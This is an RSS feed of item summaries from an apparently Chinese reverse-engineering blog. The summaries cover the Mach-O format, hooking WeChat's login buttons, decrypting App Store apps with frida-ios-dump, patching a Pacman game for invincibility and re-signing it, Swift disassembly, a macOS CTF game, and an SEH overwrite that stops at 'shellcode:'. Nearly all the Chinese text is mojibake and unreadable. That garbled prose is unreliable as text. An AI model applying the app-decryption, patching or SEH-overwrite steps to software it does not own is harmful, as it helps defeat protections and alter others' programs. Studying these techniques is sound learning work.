<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Reverse Engineering on aiQG_&#39;s Blog</title>
    <link>https://aiQG.github.io/tags/reverse-engineering/</link>
    <description>Recent content in Reverse Engineering on aiQG_&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Mon, 18 May 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://aiQG.github.io/tags/reverse-engineering/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Machâ€”Oæ–‡ä»¶</title>
      <link>https://aiQG.github.io/macho%E6%96%87%E4%BB%B6/</link>
      <pubDate>Mon, 18 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://aiQG.github.io/macho%E6%96%87%E4%BB%B6/</guid>
      <description>Header: æŒ‡æ˜äº† cpu æ¶æ„ã€å¤§å°ç«¯åºã€æ–‡ä»¶ç±»å‹ã€Load Commands ä¸ªæ•°ã€å¤§å°ç­‰ä¸€äº›åŸºæœ¬ä¿¡æ¯. (æ ¡éªŒåˆæ³•æ€§, å¹¶ç¡®å®šè¿è¡Œç¯å¢ƒ)
Load Commands: æè¿°äº†æ€æ ·åŠ è½½æ¯ä¸ª Segment çš„ä¿¡æ¯. åœ¨ Mach-O æ–‡ä»¶ä¸­å¯ä»¥æœ‰å¤šä¸ª Segment, æ¯ä¸ª Segment å¯èƒ½åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ª Section.
Data: Segment çš„å…·ä½“æ•°æ®, åŒ…å«äº†ä»£ç å’Œæ•°æ®ç­‰.
Mach-O å¤´éƒ¨å®šä¹‰(macOS 10.15 sdk):
/* * The 64-bit mach header appears at the very beginning of object files for * 64-bit architectures. */ struct mach_header_64 { uint32_t	magic;	/* mach magic number identifier */ cpu_type_t	cputype;	/* cpu specifier */ cpu_subtype_t	cpusubtype;	/* machine specifier */ uint32_t	filetype;	/* type of file */ uint32_t	ncmds;	/* number of load commands */ uint32_t	sizeofcmds;	/* the size of all the load commands */ uint32_t	flags;	/* flags */ uint32_t	reserved;	/* reserved */ }; /* Constant for the magic field of the mach_header_64 (64-bit architectures) */ #define MH_MAGIC_64 0xfeedfacf /* the 64-bit mach magic number */ #define MH_CIGAM_64 0xcffaedfe /* NXSwapInt(MH_MAGIC_64) */  cputype å’Œ cpusubtype ç¡®å®š cpu ç±»å‹ã€å¹³å°</description>
    </item>
    
    <item>
      <title>iOS-Hook</title>
      <link>https://aiQG.github.io/ios-hook/</link>
      <pubDate>Thu, 06 Feb 2020 00:00:00 +0000</pubDate>
      
      <guid>https://aiQG.github.io/ios-hook/</guid>
      <description>å‰æ:
  MonkeyAPP(åŠå…¶ä¾èµ–)
  class-dump
  Reveal
  ç ¸å£³
  å¯¹äºéè¶Šç‹±è®¾å¤‡, å¯ä»¥åœ¨TargetAppæ–‡ä»¶å¤¹ä¸­æ”¾å…¥ipaåç¼–è¯‘è¿è¡Œä¸€ä¸‹(å®‰è£…åˆ°è®¾å¤‡ä¸Š), ç„¶åè¿è¡ŒRevealåˆ†æAPPçš„UIç»“æ„, è®°å½•ä¸‹éœ€è¦hookçš„æ§ä»¶ç±»å, åœ¨ç”¨class-dumpå¯¼å‡ºçš„å¤´æ–‡ä»¶ä¸­æ‰¾åˆ°è¿™ä¸ªç±»çš„ç›¸å…³æ–¹æ³•è¿›è¡Œhook.
å¯ä»¥åœ¨hookä»£ç ä¸­åˆ©ç”¨%log(Logosè¯­æ³•)æ‰“å°å‡ºè¢«hookå‡½æ•°çš„æ‰€æœ‰å‚æ•°, ä»è€Œæ‰¾åˆ°æœ‰ç”¨ä¿¡æ¯(ä¾‹å¦‚å¯¹äºUIButtonç±»å‹çš„æ§ä»¶, å¯ä»¥æ‰¾åˆ°ç‚¹å‡»å®ƒè°ƒç”¨çš„æ–¹æ³•). // å¯¹äºLogosè¯­æ³•çš„ä»£ç å†™åœ¨ HookAppDylib.xm
hook WeChat.appæ³¨å†Œå’Œç™»å½•é¡µé¢:
Revealæ‰¾åˆ°ç™»å½•å’Œæ³¨å†Œä¸¤ä¸ªæŒ‰é’®æ˜¯FixTitleColorButtonç±»
åœ¨class-dumpå¯¼å‡ºçš„å¤´ä¸­æ‰¾åˆ°è¿™ä¸ªç±», å‘ç°æ˜¯ç»§æ‰¿UIButtonçš„, æ‰€ä»¥hook FixTitleColorButtonçš„ -(void)addTarget:(id)target action:(SEL)action forControlEvents:(UIControlEvents)controlEvents æ–¹æ³•. (è¿™ä¸ªå‡½æ•°å­˜åœ¨äºçˆ¶ç±»UIButton, å¯ä»¥ä»Appleå®˜æ–¹æ–‡æ¡£æ‰¾åˆ°å…¶ä»–æœ‰ç”¨çš„å‡½æ•°)
åˆ©ç”¨%logæ‰¾åˆ°åˆå§‹åŒ–çš„ä¿¡æ¯(æŸ¥çœ‹å‚æ•°controlEvents)
%hook FixTitleColorButton - (void)addTarget:(id)target action:(SEL)action forControlEvents:(UIControlEvents)controlEvents{ %log; %orig(target, action, controlEvents); } %end  å¾—åˆ°ä¸¤æ®µè¾“å‡º
WeChat[1136:259626] [1;36m[HookAppDylib] [m [0;36m/Users/zc/Desktop/HookApp/HookAppDylib/Logos/HookAppDylib.xm:9 [m [0;30;46mDEBUG: [m -[&amp;lt;FixTitleColorButton: 0x14fd411e0&amp;gt; addTarget:&amp;lt;WCAccountLoginControlLogic: 0x2805a9c70&amp;gt; action:onFirstViewLogin forControlEvents:0x40] WeChat[1136:259626] [1;36m[HookAppDylib] [m [0;36m/Users/zc/Desktop/HookApp/HookAppDylib/Logos/HookAppDylib.</description>
    </item>
    
    <item>
      <title>iOSé€†å‘-Appä¿®æ”¹</title>
      <link>https://aiQG.github.io/ios%E9%80%86%E5%90%91-app%E4%BF%AE%E6%94%B9/</link>
      <pubDate>Sat, 18 Jan 2020 00:00:00 +0000</pubDate>
      
      <guid>https://aiQG.github.io/ios%E9%80%86%E5%90%91-app%E4%BF%AE%E6%94%B9/</guid>
      <description>//pacmançœŸå¥½ç©
ç»™panman256åŠ ä¸Šä¸€ä¸ªæ— æ•Œ
é¦–å…ˆå½“ç„¶æ˜¯&amp;quot;ç ¸å£³&amp;quot;
çœ‹åˆ°æ˜¯unityåšçš„, ç”¨Il2CppDumper ä»Unity il2cppæ–‡ä»¶è¿˜åŸDLl, ç”Ÿæˆçš„idaè„šæœ¬å¯ä»¥æ¢å¤å¾ˆå¤šå‡½æ•°å, dump.csä¿å­˜ç”¨åˆ°çš„ç±»
ç„¶åæ‹¿åˆ°binary, ç”¨idaåŠ è½½, è·‘Il2CppDumperç”Ÿæˆçš„è„šæœ¬, æ¢å¤ä¸€ä¸‹å‡½æ•°å(è¿™ä¸¤æ­¥å¯èƒ½éœ€è¦å¾ˆé•¿æ—¶é—´, è¿™æœŸé—´å¯ä»¥æ‰¾æ‰¾dump.csé‡Œå¯èƒ½æœ‰ç”¨çš„æ–¹æ³•)
æ‰¾åˆ°ä¸€ä¸ªplayerç±», é‡Œé¢æœ‰ä¸ª KillCharacter å’Œ KillCharacterNow , çŒœæµ‹å’Œç©å®¶æ­»äº¡æœ‰å…³
lldbè¿œç¨‹è°ƒè¯•, image list -b pacman256  æ‰¾åˆ°åŸºåœ°å€, é€šè¿‡dump.csç»“åˆidaæ‰¾åˆ°å‡½æ•°ä½ç½®ä¸‹æ–­ç‚¹è°ƒè¯•//arm64çš„å¯„å­˜å™¨æ¯”è¾ƒç‰¹æ®Š, ä¸»è¦å…³æ³¨PC(ä¸‹ä¸€æ¡æ‰§è¡Œçš„æŒ‡ä»¤)å’ŒLR(å­ç¨‹åºç»“æŸåæ‰§è¡Œçš„æŒ‡ä»¤(ç›¸å½“äºè¿”å›åœ°å€))
å›æº¯æ‰¾åˆ°åç§»ä¸º0x7CEA4çš„OnTriggerEnterå‡½æ•°(BadGuyç±»)//ä¸€çœ‹å°±çŸ¥é“æ˜¯ç¢°åˆ°ğŸ‘»è§¦å‘çš„åˆ¤æ–­////å½“ç„¶ä¸èƒ½ç›´æ¥æŠŠè¿™ä¸ªå‡½æ•°ç»™å¹²æ‰, å› ä¸ºæ¸¸æˆä¸­è¿˜æœ‰å„ç§æ€æ­»ğŸ‘»çš„æœºåˆ¶
è¿™ä¸ªå‡½æ•°åç§»0x6e8å¤„æœ‰ä¸ª B.NE çš„å…³é”®è·³è½¬, æ¯å½“ç©å®¶ç¢°åˆ°ghostå°±ä¼šè§¦å‘åˆ¤æ–­, è‹¥è·³è½¬åˆ™ç©å®¶ä¸æ­»äº¡, ä¸è·³è½¬åˆ™ç©å®¶æ­»äº¡
æ”¹æˆ 0010007D58C 06 00 00 14 B loc_10007D5A4 æ— æ¡ä»¶è·³è½¬
ä¿å­˜, å¤åˆ¶å‡ºæ¥é‡ç­¾å
å®‰è£…åˆ°iPhoneä¸Šç©ç©
æˆåŠŸ!
//è¿™é‡Œæˆ‘ç”¨çš„æ˜¯è¶Šç‹±çš„iPhone5S iOS12.3(16F156) ä»App Storeä¸‹è½½, æœ€åå®‰è£…åœ¨æœªè¶Šç‹±çš„iPhone7 iOS13.3(17C54)ä¸Š, å®Œç¾è¿è¡Œ!</description>
    </item>
    
    <item>
      <title>iOSé€†å‘-â€é‡ç­¾åâ€œ</title>
      <link>https://aiQG.github.io/ios%E9%80%86%E5%90%91-%E9%87%8D%E7%AD%BE%E5%90%8D/</link>
      <pubDate>Fri, 17 Jan 2020 00:00:00 +0000</pubDate>
      
      <guid>https://aiQG.github.io/ios%E9%80%86%E5%90%91-%E9%87%8D%E7%AD%BE%E5%90%8D/</guid>
      <description>iOSé€†å‘æœ€åä¸€æ­¥: â€œé‡ç­¾åâ€
ç¬¬ä¸€æ­¥, å°†Payloadæ–‡ä»¶å¤¹å‹ç¼©æˆ.zip, ç„¶åå°†.zipåç¼€æ”¹æˆ.ipa
æ‰¾åˆ°ä¸€ä¸ª .mobileprovision æ–‡ä»¶(æœ€å¥½æ˜¯å…ˆåˆ›å»ºä¸€ä¸ªiOSé¡¹ç›®, åœ¨çœŸæœºä¸Šè·‘ä¸€ä¸‹, ç„¶ååˆ° ~/Library/MobileDevice/Provisioning\ Profiles/  å¤åˆ¶)(è¿™ä¸ªè¯ä¹¦åˆ°æœŸå¾ˆå¿«, åˆ°æ—¶å€™åˆè¦é‡ç­¾å)//, æ­£åœ¨æ¢ç´¢ä¼˜ç§€çš„é‡ç­¾åæ–¹æ¡ˆ
è¿è¡Œ iReSign(æˆ–ios-app-signer) é¡¹ç›®, åˆ†åˆ«å¡«ä¸Šè¦ç­¾åçš„.ipa, .mobileprovision æ–‡ä»¶è·¯å¾„, (.plistä¸ç”¨å¡«), é¡¹ç›®çš„Bundle Identifier(å¯ä»¥åœ¨é¡¹ç›®çš„é…ç½®æ–‡ä»¶é‡Œæ‰¾åˆ°), è¯ä¹¦(å’Œé¡¹ç›®çš„Bundle Identifier å¯¹åº”, åŒæ ·å¯ä»¥åœ¨é¡¹ç›®çš„é…ç½®æ–‡ä»¶é‡Œæ‰¾åˆ°)
// âš ï¸: é€‰æ‹©.plistè·¯å¾„çš„ä½ç½®åº”è¯¥ç•™ç©º(ç¨‹åºä¼šè‡ªåŠ¨æ ¹æ®.mobileprovisionæ–‡ä»¶å¯¼å‡º.plist). é™¤éæœ‰ç‰¹æ®Šéœ€è¦
// âš ï¸: å¯¹äºæ²¡æœ‰è¿›è¡Œç ¸å£³çš„æ’ä»¶å’Œapp, ç­¾å/å®‰è£…æ—¶å¯èƒ½å‡ºé”™
é‡ç­¾åå¥½çš„.ipaå®‰è£…: æ‰“å¼€Xcode -&amp;gt; Window -&amp;gt; Devices and Simulators -&amp;gt; åœ¨INSTALL APPSæ·»åŠ .ipa -&amp;gt; å®‰è£…å®Œæˆ
å¦‚æœå®‰è£…å¤±è´¥, å¯èƒ½æ˜¯ç­¾åæˆ–è€….ipaçš„æ–‡ä»¶ç»“æ„ä¸æ­£ç¡®(åº”è¯¥ç›´æ¥å‹ç¼©Payloadæ–‡ä»¶å¤¹)</description>
    </item>
    
    <item>
      <title>iOSé€†å‘-â€œç ¸å£³â€</title>
      <link>https://aiQG.github.io/ios%E9%80%86%E5%90%91-%E7%A0%B8%E5%A3%B3/</link>
      <pubDate>Thu, 16 Jan 2020 00:00:00 +0000</pubDate>
      
      <guid>https://aiQG.github.io/ios%E9%80%86%E5%90%91-%E7%A0%B8%E5%A3%B3/</guid>
      <description>iOSé€†å‘ç¬¬ä¸€æ­¥: &amp;ldquo;ç ¸å£³&amp;rdquo;
ç”±äºApp Storeä¸Šä¸‹è½½ä¸‹æ¥çš„åº”ç”¨æ˜¯å¥—äº†å±‚å£³çš„(ç›®æµ‹æ˜¯å‹ç¼©å£³), æ‰€ä»¥è¦dumpä¸€ä¸‹
å·¥å…· macOSç«¯   iproxy ç”¨äºæŠŠç«¯å£ä»£ç†åˆ°sshä¸Š(iproxyæ˜¯usbmuxdè‡ªå¸¦çš„ä¸€ä¸ªå°å·¥å…·) brew install usbmuxd
  frida å’Œ frida-ios-dump dumpçš„ä¸»è§’
  iOSç«¯  è¶Šç‹± // axi0mX å¤§ç¥æŒ–åˆ°iPhone BootROMçº§åˆ«çš„æ¼æ´è®©iPhone5såˆ°iPhoneX, iOS 12.3 åŠä»¥ä¸Šç³»ç»Ÿèƒ½å¤Ÿè¶Šç‹± https://checkra.in/ ğŸ®ğŸº  // âš ï¸: ç”¨checkra1nè¶Šç‹±éœ€è¦ä½¿ç”¨USBè¿æ¥, ç”¨lightning to type-Cæ•°æ®çº¿ä¼šæ— æ³•è¿›å…¥DFUæ¨¡å¼
 Cydiaä¸Šå®‰è£…Frida æ·»åŠ æº https://build.frida.re/  å®‰è£…fridaæ³¨æ„å®‰è£…åˆ°python2è¿˜æ˜¯python3, å¯¹åº”frida-ios-dumpçš„ä¸åŒåˆ†æ”¯(3.xçš„åˆ†æ”¯æ˜¯python3çš„)//python2å®˜æ–¹éƒ½ä¸æ”¯æŒäº†, è¿˜æ˜¯å®‰è£…python3å§
å…‹éš†frida-ios-dump
git clone -b 3.x https://github.com/AloneMonkey/frida-ios-dump.git
//å¯ä»¥åˆ°dump.pyé‡Œä¿®æ”¹è¿æ¥çš„å‚æ•° ä¸€èˆ¬é»˜è®¤:
User = &#39;root&#39; Password = &#39;alpine&#39; Host = &#39;localhost&#39; Port = 2222  è¿›å…¥ frida-ios-dump ç›®å½•æ›´æ–°ä¸€ä¸‹ä¾èµ–</description>
    </item>
    
    <item>
      <title>ä»printå¼€å§‹</title>
      <link>https://aiQG.github.io/%E4%BB%8Eprint%E5%BC%80%E5%A7%8B/</link>
      <pubDate>Tue, 14 Jan 2020 00:00:00 +0000</pubDate>
      
      <guid>https://aiQG.github.io/%E4%BB%8Eprint%E5%BC%80%E5%A7%8B/</guid>
      <description>çœ‹äº†å‡ å¤©çš„metadataæ„Ÿè§‰æ²¡ä»€ä¹ˆæ”¶è·, å‘ç°å¯¹swiftçš„ä¸€äº›ç‰¹æ€§è¿˜ä¸æ˜¯å¾ˆæ¸…æ¥š, å†³å®šä»æœ€å¸¸ç”¨çš„printå¼€å§‹åˆ†æ
func callFunc() { print(&amp;quot;HelloWorld!&amp;quot;) }  callFunc() @ hackSwift: 0x100000a50: push rbp 0x100000a51: mov rbp, rsp 0x100000a54: sub rsp, 0x30 0x100000a58: mov rax, qword ptr [rip + 0x5b1] ; (void *)0x00007fff90c55908: type metadata for Any 0x100000a5f: add rax, 0x8	; Anyçš„Super point 0x100000a63: mov edi, 0x1 ; printç¬¬ä¸€ä¸ªå‚æ•°çš„ä¸ªæ•° 0x100000a68: mov rsi, rax ; åˆå§‹åŒ–(Any)æ•°ç»„ 0x100000a6b: call 0x100000e60 ; symbol stub for: Swift._allocateUninitializedArray&amp;lt;A&amp;gt;(Builtin.Word) -&amp;gt; (Swift.Array&amp;lt;A&amp;gt;, Builtin.RawPointer) 0x100000a70: lea rdi, [rip + 0x4d5] ; &amp;quot;HelloWorld!</description>
    </item>
    
    <item>
      <title>macOSé€†å‘ä¹‹â€œä½ å¤§æ¦‚éœ€è¦ä¸€ä¸ªå¸¦barçš„macâ€â€”â€”åŠ¨æ€</title>
      <link>https://aiQG.github.io/macos%E9%80%86%E5%90%91%E4%B9%8B%E4%BD%A0%E5%A4%A7%E6%A6%82%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%E5%B8%A6bar%E7%9A%84mac%E5%8A%A8%E6%80%81/</link>
      <pubDate>Wed, 08 Jan 2020 00:00:00 +0000</pubDate>
      
      <guid>https://aiQG.github.io/macos%E9%80%86%E5%90%91%E4%B9%8B%E4%BD%A0%E5%A4%A7%E6%A6%82%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%E5%B8%A6bar%E7%9A%84mac%E5%8A%A8%E6%80%81/</guid>
      <description>macOSä¸Šå¯¹äºç¬¬ä¸‰æ–¹è½¯ä»¶ï¼Œä¸€èˆ¬ä¸èƒ½ç›´æ¥åŠ¨æ€è°ƒè¯•(æƒé™)
//runçš„æ—¶å€™lldbä¼šæŠ¥ error: process exited with status -1 (Error 1)
éœ€è¦è¿›è¡Œä¸€ä¸‹æ­¥éª¤
å…ˆæŸ¥çœ‹æƒé™
codesign -d --entitlements :- [yourAPP]
å°†å½“å‰æƒé™é…ç½®å¯¼å‡º
codesign -d --entitlements :- [yourAPP] &amp;gt;&amp;gt; temp.plist
åœ¨temp.plistä¸­æ·»åŠ 
&amp;lt;key&amp;gt;com.apple.security.get-task-allow&amp;lt;/key&amp;gt; &amp;lt;true/&amp;gt;  ä¿å­˜
æ‰¾åˆ°ç³»ç»Ÿä¸Šå®‰è£…çš„æ‰€æœ‰ç­¾åèº«ä»½çš„åˆ—è¡¨(éœ€è¦å¼€å‘è€…è´¦å·)
security find-identity -v -p codesigning
é‡æ–°ç­¾å
codesign --sign &amp;quot;Apple Development: ***@***.com (***)&amp;quot; -f --timestamp --options=runtime --entitlements temp.plist [yourAPP] 
ç­¾åå®Œæˆï¼Œå¯ä»¥è°ƒè¯•
 é™æ€åˆ†æçš„è¿‡ç¨‹åœ¨è¿™é‡Œ
è¿™é‡Œç”¨åŠ¨æ€åˆ†æçš„æ–¹æ³•éªŒè¯ä¸€ä¸‹é™æ€åˆ†æ
é¦–å…ˆæŒ‰ç…§ä¸Šé¢ç»™å‡ºçš„æ­¥éª¤åŠ ä¸Šæƒé™
ç„¶ååœ¨ sub_1000034C0 å¼€å§‹å¤„ä¸‹æ–­ç‚¹, å¯ä»¥å‘ç°æ¯æ¬¡å­å¼¹ä¸æ•Œäººæ¥è§¦æˆ–è€…ç©å®¶ä¸æ•Œäººæ¥è§¦å°±ä¼šè§¦å‘æ–­ç‚¹ï¼Œç¡®å®šè¿™æ˜¯ä¸€ä¸ªåˆ¤æ–­ç¢°æ’çš„å‡½æ•°
å°†æ–­ç‚¹ä¸‹åœ¨ 0x100003974 (cmp qword ptr [rbx+rax], 114514)å¤„ï¼Œå¯ä»¥å‘ç°æ¯æ¬¡å‡»ä¸­æ•Œäººä¼šè¢«æ–­ä¸‹ï¼Œå¹¶ä¸”rbx+raxå¤„çš„å€¼æ¯”ä¹‹å‰å¢åŠ 1
ä»è€Œå¾ˆå¿«é€Ÿåœ°å°±èƒ½æ‰¾åˆ°ä¿å­˜åˆ†æ•°çš„åœ°æ–¹
å°†æ–­ç‚¹ä¸‹åœ¨ 0x1000037c8 (xor r12b, r13b)å¤„ï¼Œè¿è¡Œï¼Œå½“å‡»ä¸­ä¸€ä¸ªæ•Œäººåè¢«æ–­äº†ä¸‹æ¥ ä¹‹åmov byte ptr [rax + rdx + 0x20], r12b å°†ç»“æœä¿å­˜åœ¨äº†ä¸€ä¸ªæ•°ç»„ä¸­</description>
    </item>
    
    <item>
      <title>macOSé€†å‘ä¹‹ â€œä½ å¤§æ¦‚éœ€è¦ä¸€ä¸ªå¸¦barçš„macâ€</title>
      <link>https://aiQG.github.io/macos%E9%80%86%E5%90%91%E4%B9%8B-%E4%BD%A0%E5%A4%A7%E6%A6%82%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%E5%B8%A6bar%E7%9A%84mac/</link>
      <pubDate>Wed, 27 Nov 2019 00:00:00 +0000</pubDate>
      
      <guid>https://aiQG.github.io/macos%E9%80%86%E5%90%91%E4%B9%8B-%E4%BD%A0%E5%A4%A7%E6%A6%82%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%E5%B8%A6bar%E7%9A%84mac/</guid>
      <description>//è¿™æ˜¯ä¸€ä¸ªmacOSä¸‹ç”¨swift5 + SpriteKitæ¡†æ¶å†™å‡ºæ¥çš„touchbarä¸Šçš„æ¸¸æˆ è€ƒè™‘åˆ°æœ‰macçš„å¸ˆå‚…å¹¶ä¸å¤šï¼Œæ‰€ä»¥è¿™é‡Œæä¾›ä¸€ä¸ªé™æ€åˆ†æçš„è§£æ³•&amp;hellip;
//åŠ¨æ€åˆ†æé“¾æ¥
å¾—åˆ°çš„æ˜¯ä¸€ä¸ªåç¼€ä¸º.appçš„æ–‡ä»¶å¤¹(macOSä¸‹çš„åº”ç”¨)ã€‚Contents\MacOSä¸‹æœ‰ä¸€ä¸ªtouchbarGameè¿™ä¸ªå°±æ˜¯æ¸¸æˆæœ¬ä½“
 å…³äº.appé‡Œå„ä¸ªæ–‡ä»¶ï¼š _CodeSignatureæ–‡ä»¶å¤¹ æ˜¯å„ä¸ªæ–‡ä»¶çš„æ•°å­—ç­¾åé˜²æ­¢è¢«ç¯¡æ”¹ Resourcesæ–‡ä»¶å¤¹ æ˜¯å„ç§èµ„æºæ–‡ä»¶ MacOSæ–‡ä»¶å¤¹ æ˜¯æ­¤Appçš„çœŸæ­£å¯æ‰§è¡Œæ–‡ä»¶ Info.plistæ–‡ä»¶ æ˜¯Appçš„åŸºæœ¬ä¿¡æ¯(æ¯”å¦‚æœ€ä½ç³»ç»Ÿç‰ˆæœ¬è¦æ±‚, ç‰ˆæœ¬å·, Copyrightç­‰ç­‰æ ‡è¯†) PkgInfoæ–‡ä»¶ æ˜¯ä¸€ä¸ªå¯é€‰çš„8ä¸ªå­—èŠ‚é•¿åº¦çš„æ–‡ä»¶, å¯ä¿å­˜ç¨‹åºç±»å‹å’Œåˆ›å»ºè€…ç­¾å(å½“ç„¶è¿™äº›å¯ä»¥å†™åœ¨ Info.plist ä¸­), è¿™ä¸ªæ–‡ä»¶é€šå¸¸åŒ…å«å››å­—èŠ‚çš„ç¨‹åºç±»å‹ä¿¡æ¯(é€šå¸¸ä¸º APPL)å’Œå››ä¸ªå­—èŠ‚çš„ç­¾åä¿¡æ¯(æ¯”å¦‚ System Preferences.app çš„ PkgInfo å°±æ˜¯ APPLsprf) Assets.carä¸­ä¿å­˜ç€èµ„æºå›¾ç‰‡
 //å…³äºèµ„æºæ–‡ä»¶Assets.carçš„åˆ†æé“¾æ¥ Assets.caræ–‡ä»¶å¯ä»¥æå–å‡ºèµ„æºå›¾ç‰‡(ä¼¼ä¹æœ‰åœ¨çº¿æå–çš„, ä½†æ˜¯å¹¶ä¸èƒ½æå–å‡ºå…¨éƒ¨çš„ä¸œè¥¿) (å…³äºæå–èµ„æº, ä¼¼ä¹æ²¡æœ‰æ‰¾åˆ°émacOSä¸Šçš„ç°æˆå·¥å…·) å¯ä»¥çœ‹åˆ°æœ‰&amp;quot;shot&amp;quot;,&amp;ldquo;rock&amp;quot;å’Œ&amp;quot;enemy&amp;quot;çš„å›¾ç‰‡, çŒœæµ‹æ˜¯&amp;quot;æ‰“é£æœºçš„æ¸¸æˆ&amp;rdquo;(è·‘ä¸èµ·æ¥åªèƒ½çŒœäº†å‘—&amp;hellip;) //è¿™ä¸ªæ¸¸æˆæ‰“èµ·æ¥æ˜¯è¿™æ ·çš„&amp;hellip;&amp;hellip;idaåˆ†ætouchbarGameå¯ä»¥çœ‹åˆ°å‡½æ•°é‡Œæœ‰Objective-Cçš„æ–¹æ³•å’Œswiftçš„å‡½æ•°, å¤§å¤šæ•°çš„å‡½æ•°çš„åå­—idaéƒ½ç»™åˆ†æå‡ºæ¥äº†//æ‰€ä»¥çŒœæµ‹ä¸ªåˆ«å‡½æ•°çš„ä½œç”¨è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„  OCè°ƒç”¨å‡½æ•°çš„æœºåˆ¶æ˜¯&amp;quot;send message&amp;quot;(OCçš„Runtime), ç›¸å½“äºåœ¨è¿è¡Œæ—¶æ‰ç¡®å®šå‡½æ•°è°ƒç”¨, æ‰€ä»¥ctrl+xæŸ¥çœ‹å‡½æ•°çš„äº¤å‰å¼•ç”¨å‡ ä¹æ˜¯æ‰¾ä¸åˆ°å•¥ä¿¡æ¯çš„äº†
 å› ä¸ºæ— æ³•è¿è¡Œ(æ— æ³•çŸ¥é“ç¨‹åºè¾“å…¥è¾“å‡º), æˆ‘ä»¬å¯ä»¥æ‰¾æ‰¾ç¨‹åºä¸­çš„å­—ç¬¦ä¸², æå–å…³é”®ä¿¡æ¯
  å‘ç°æœ‰ä¸ª&amp;quot;/114514) R(estart)&amp;quot; //114514??? æˆ‘ä»¬äº¤å‰å¼•ç”¨è·Ÿè¿‡å»åˆ°sub_100002190, å‘ç°è¿™ä¸ªå‡½æ•°é‡ŒOCå‘äº†å¾ˆå¤šå¸¦&amp;quot;set&amp;quot;çš„æ¶ˆæ¯, å¯ä»¥æ¨æ–­è¿™é‡Œæ˜¯åˆå§‹åŒ–æ•´ä¸ªæ¸¸æˆçš„ä½ç½® é‚£è¿™ä¸ªå­—ç¬¦ä¸²åº”è¯¥å°±æ˜¯ä¸€ä¸ª(æç¤ºé‡æ–°å¼€å§‹çš„)Label
  å¯ä»¥æ‰¾åˆ°å¤´çš„ä¿¡æ¯ çœ‹åˆ°ä½¿ç”¨äº†å‡ ä¸ªæ¡†æ¶, googleä¸€ä¸‹å‘ç°SpriteKitè¿™ä¸ªæ¡†æ¶æœ‰&amp;quot;Physics Simulation&amp;quot;çš„class, å…¶ä¸­æœ‰ä¸€ä¸ªSKPhysicsContactçœ‹Appleæ–‡æ¡£çš„æè¿°å¯ä»¥å‘ç°è¿™ä¸ªä¸œè¥¿å’Œç‰©ä½“çš„æ¥è§¦(ç¢°æ’)æœ‰å…³(å› ä¸ºè¿™æ˜¯ä¸ªæ¸¸æˆ, æ‰€ä»¥æ£€æµ‹ç¢°æ’çš„åŠŸèƒ½æ˜¯ä¸€ä¸ªå…³é”®çš„ä½ç½®) ç»§ç»­å¾€ä¸‹çœ‹æ–‡æ¡£, æœ‰ä¸¤ä¸ªå˜é‡bodyAå’ŒbodyB ç”±äºOCæ‰§è¡Œå‡½æ•°çš„æœºåˆ¶(å‘æ¶ˆæ¯), æˆ‘ä»¬å¯ä»¥åœ¨å­—ç¬¦ä¸²ä¸­æœåˆ°è¿™ä¸¤ä¸ªå˜é‡çš„åå­—, å¹¶ä¸”å¯ä»¥äº¤å‰å¼•ç”¨æ‰¾åˆ°ç»™Runtime System å‘æ¶ˆæ¯çš„å‡½æ•°sub_1000034C0   //ä¹Ÿå¯ä»¥å°è¯•æœç´¢ä¸€ä¸‹åŒ…å«&amp;quot;print&amp;quot;çš„å‡½æ•°, æ‰¾åˆ°_$ss5print_9separator10terminatoryypd_S2StF, å‘ç°æœ‰ä¸¤å¤„è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°, è€Œä¸”ä¹Ÿéƒ½åœ¨sub_1000034C0é‡Œ</description>
    </item>
    
    <item>
      <title>SEHå¼‚å¸¸å¤„ç†</title>
      <link>https://aiQG.github.io/seh%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</link>
      <pubDate>Wed, 02 Oct 2019 00:00:00 +0000</pubDate>
      
      <guid>https://aiQG.github.io/seh%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</guid>
      <description>è·Ÿåˆ°mainé‡Œå‘ç°mainé‡Œçš„SHEèŠ‚ç‚¹å·²ç»åˆå§‹åŒ– é‡å¯ç¨‹åºæ‰¾åˆ°åˆå§‹åŒ–mainçš„SHEèŠ‚ç‚¹çš„å‡½æ•° è¿›å…¥testå‡½æ•°çš„SHEèŠ‚ç‚¹åˆå§‹åŒ– è§¦å‘æ–­ç‚¹åå¯ä»¥çœ‹è§eipè·³åˆ°äº†testå‡½æ•°çš„SEå¤„ç†å‡½æ•°(å¹¶ä¸”åœ¨è·³è¿‡å»çš„è¿‡ç¨‹ä¸­åˆåˆ›å»ºäº†ä¸€ä¸ªèŠ‚ç‚¹) è¿›å…¥vcruntim, å¾€ä¸‹æ‰¾åˆ°è·å–å¼‚å¸¸å¤„ç†å‡½æ•°åœ°å€çš„ä½ç½® å›åˆ°strcpyå¤„, è®¡ç®—bufå˜é‡åˆ°SEHèŠ‚ç‚¹(ä¿å­˜å¤„ç†å‡½æ•°çš„åœ°å€å¤„)çš„ç›¸å¯¹åç§»(==0xd8) è¦†ç›–æˆåŠŸ  åŸºæœ¬æµç¨‹æ¢³ç†æ¸…æ¥šäº† å°è¯•è¦†ç›–å‡½æ•°åœ°å€ vs2019å…³é—­SAFESEH ç¨‹åºæ— æ³•è·³åˆ°æ ˆä¸Šæ‰§è¡Œ(æ£€æŸ¥äº†ç›®æ ‡åœ°å€æ˜¯å¦åœ¨æ ˆå†…) æ‰€ä»¥é‡‡ç”¨ç›´æ¥è·³åˆ°å…¨å±€å˜é‡shellcode(0x403018)å¤„æ‰§è¡Œ shellcode:
